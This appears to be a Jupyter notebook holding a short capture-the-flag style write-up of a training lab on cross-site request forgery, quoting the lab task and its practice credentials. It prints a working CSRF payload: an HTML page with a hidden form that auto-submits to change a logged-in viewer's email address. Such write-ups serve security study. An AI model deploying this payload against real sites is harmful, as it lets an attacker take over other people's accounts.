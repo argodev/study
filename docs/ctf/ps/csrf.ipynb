{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Cross-site Request Forgery (CSRF)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## CSRF vulnerability with no defenses\n",
    "\n",
    "```{admonition} Question\n",
    "This lab's email change functionality is vulnerable to CSRF.\n",
    "\n",
    "To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.\n",
    "\n",
    "You can log in to your own account using the following credentials: `wiener:peter`\n",
    "```\n",
    "\n",
    "This first one was easy... following the instructions in the documentation on CSRF, you simply craft an evil payload something similar to the following:\n",
    "\n",
    "```html\n",
    "<html>\n",
    "  <body>\n",
    "    <form action=\"https://acbd1fc91ebd63dfc0dc1e3100420089.web-security-academy.net/my-account/change-email\" method=\"POST\">\n",
    "      <input type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\" />\n",
    "    </form>\n",
    "    <script>\n",
    "      document.forms[0].submit();\n",
    "    </script>\n",
    "  </body>\n",
    "</html>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
